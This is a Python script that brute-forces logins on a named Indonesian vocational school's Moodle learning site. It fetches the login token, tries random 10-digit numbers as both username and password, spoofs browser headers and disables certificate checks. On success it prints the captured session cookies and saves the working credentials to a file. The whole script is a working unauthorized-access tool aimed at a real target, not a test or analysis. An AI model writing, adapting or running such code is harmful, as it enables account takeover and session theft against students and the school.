import random
import requests
import time
import re
import os
import json
from rich.console import Console
from bs4 import BeautifulSoup
from rich import print as prints
from rich.panel import Panel
from rich.table import Table
from rich.tree import Tree
import urllib3

# Disable the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

def generat():
    random_number = random.randint(10000000, 100000000 - 1)
    formatted_number = f"{random_number:010d}"
    return formatted_number

def login():
    while True:
        try:
            print('')
            idf = generat()
            time.sleep(1)
            p = session.get("https://lms.smkn4padalarang.sch.id/login/index.php", verify=False)
            logintoken_match = re.search('name="logintoken" value="(.*?)"', str(p.text))
            
            if not logintoken_match:
                prints(Panel.fit("[bold red]Gagal mendapatkan logintoken, silakan coba lagi!"))
                return
            logintoken = logintoken_match.group(1)
            heade = {
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Host': 'lms.smkn4padalarang.sch.id',
                'Referer': 'https://lms.smkn4padalarang.sch.id/',
                'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
            }
            data = {
                "logintoken": logintoken,
                "username": idf,
                "password": idf
            }
            response = session.post(
                "https://lms.smkn4padalarang.sch.id/login/index.php",
                headers=heade,
                data=data,
                allow_redirects=True,
                verify=False
            )

            if 'Dashboard' in response.text:
                cookies = "; ".join([
                    f"{key}={value}"
                    for key, value in session.cookies.get_dict().items()
                ])
                # Output keberhasilan
                Meledak = Tree(Panel.fit("[bold green]Log in Success"))
                Meledak.add(Panel.fit(f"[bold green]Username: {idf}, Password: {idf}"))
                Meledak.add(Panel.fit(f"[bold green]Cookies tersimpan: {cookies}"))
                prints(Meledak)
                open('data-success.txt','a').write(idf+"|"+idf+"\n")
                break  # Exit loop if login is successful
            else:
                prints(Panel.fit(f"[bold red]Username {idf} atau password {idf} salah, coba lagi!"))
                open('data-fail.txt','a').write(idf+"|"+idf+"\n")
        except Exception as e:
            prints(Panel.fit(f"[bold red]Terjadi kesalahan: {str(e)}"))

login()
